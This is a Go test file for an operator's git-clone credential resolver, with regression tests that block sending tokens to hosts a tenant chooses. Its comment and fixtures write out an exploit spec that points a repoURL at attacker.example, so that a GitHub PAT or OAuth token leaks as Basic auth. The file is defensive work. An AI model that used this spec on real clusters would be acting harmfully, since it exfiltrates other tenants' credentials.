package skillsource

import (
	"context"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// spec.repoURL (where to go) and spec.auth (which credential to send) were two
// independent, unvalidated fields on the same tenant-writable CR, and nothing
// tied them together. resolveToken resolved ANY credential on ANY AgentIdentity
// in the namespace and handed the raw value to the clone as an HTTP Basic
// PASSWORD against whatever host the same tenant wrote:
//
//	spec:
//	  repoURL: "https://attacker.example/x.git"
//	  auth: {agentIdentity: prod-github, credential: org-pat}
//
// One object, no agent, no model, no approval. On the next reconcile the
// operator issued GET https://attacker.example/x.git/info/refs with
// Authorization: Basic base64("x-access-token:<the PAT>"). Any static or oauth
// credential in the namespace was reachable — oauth's ReadStoredValue returns
// the live access_token, so an upstream MCP service token exfiltrated
// identically to a git PAT — and the operator reads the Secret with its OWN
// cluster-wide credentials, so the actor never needed `get secrets`.
func TestResolveToken_RefusesACredentialScopedToAnotherHost(t *testing.T) {
	src, id, sec := fixtures()
	id.Spec.Credentials[0].AllowedHosts = []string{"github.com"}
	src.Spec.RepoURL = "https://attacker.example/x.git"

	c := newClient(t, src, id, sec)
	r := &Reconciler{Client: c, SecretReader: newSecretReader(c)}

	got, err := r.resolveToken(context.Background(), src)

	require.Error(t, err, "a credential scoped to github.com must not be sent to attacker.example")
	assert.Empty(t, got, "and nothing may be returned on the refused path")
	assert.Contains(t, err.Error(), "attacker.example")
}

// A credential that declares where it may go, going there, must still work —
// or the scope is just an outage.
func TestResolveToken_AllowsACredentialScopedToTheRepoHost(t *testing.T) {
	src, id, sec := fixtures()
	id.Spec.Credentials[0].AllowedHosts = []string{"github.com"}
	// src.Spec.RepoURL is already https://github.com/someorg/somerepo

	c := newClient(t, src, id, sec)
	r := &Reconciler{Client: c, SecretReader: newSecretReader(c)}

	got, err := r.resolveToken(context.Background(), src)

	require.NoError(t, err)
	assert.Equal(t, "ghp_x", got)
}

// An UNSCOPED credential is refused for a clone, and this is the half that
// actually closes the hole: allowedHosts has to default to unscoped so existing
// credentials keep working everywhere else, which would leave this path exactly
// as open as it was. There is no safe default destination for a git clone, so
// the controller demands the scope rather than inheriting the permissive
// default.
func TestResolveToken_RefusesAnUnscopedCredential(t *testing.T) {
	src, id, sec := fixtures()
	id.Spec.Credentials[0].AllowedHosts = nil // the shape every pre-upgrade credential has

	c := newClient(t, src, id, sec)
	r := &Reconciler{Client: c, SecretReader: newSecretReader(c)}

	got, err := r.resolveToken(context.Background(), src)

	require.Error(t, err, "an unscoped credential must not be sent to a tenant-chosen URL")
	assert.Empty(t, got)
	assert.Contains(t, err.Error(), "allowedHosts",
		"and the error must name the field an operator has to set")
}

// No auth at all is a PUBLIC clone and stays fine: nothing is being sent, so
// there is nothing to scope.
func TestResolveToken_APublicCloneNeedsNoScope(t *testing.T) {
	src, id, sec := fixtures()
	src.Spec.Auth = nil

	c := newClient(t, src, id, sec)
	r := &Reconciler{Client: c, SecretReader: newSecretReader(c)}

	got, err := r.resolveToken(context.Background(), src)

	require.NoError(t, err)
	assert.Empty(t, got)
}
